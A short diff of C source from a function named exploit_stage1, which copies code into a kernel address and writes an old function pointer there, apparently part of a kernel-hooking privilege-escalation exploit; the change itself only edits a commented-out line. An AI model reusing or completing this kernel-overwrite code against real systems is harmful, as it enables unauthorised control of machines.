@@ -42,7 +42,7 @@ int exploit_stage1()
   kernel_pointer=k();
   memmove(kernel_pointer+4,(void *)myuptime,(uint)(exploit_stage1-myuptime));
   memmove(kernel_pointer,(void *)(&old_func_add),4);
- // f=(void *)(*(int *)kernel_pointer);
+  //f=(void *)(*(int *)(kernel_pointer+4));
   return 1;
 }
 
